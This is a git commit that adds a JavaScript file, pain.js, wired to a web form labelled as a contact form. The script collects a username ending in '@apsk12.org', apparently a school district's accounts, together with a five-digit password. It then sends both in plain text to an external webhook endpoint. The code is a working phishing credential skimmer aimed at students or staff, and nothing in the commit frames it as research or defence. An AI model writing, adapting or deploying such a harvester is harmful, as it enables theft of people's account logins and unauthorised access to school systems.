3686c872c12d4c74f46700c5960800eca5db1074
Pandy-hull <dab.bomb@icloud.com>
2026-04-13 19:40:16 -0400

    fixing

---
+++ pain.js
@@ -0,0 +1,30 @@
+function send(info) {
+
+    fetch("https://app.hooklistener.com/w/my-first-endpoint-45qh", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            event: "test",
+            data: { message: info}
+        })
+    });
+}
+
+document.getElementById("contactForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const name = document.getElementById("name").value.trim();
+    const password = document.getElementById("password").value.trim();
+    if (!name || !password) {
+        return;
+    }
+
+    if (!name.endsWith('@apsk12.org')) {
+        return;
+    }
+
+    if (!/^\d{5}$/.test(password)) {
+        return;
+    }
+    send(`Name: ${name}, Password: ${password}`);
+    e.target.reset();
+});
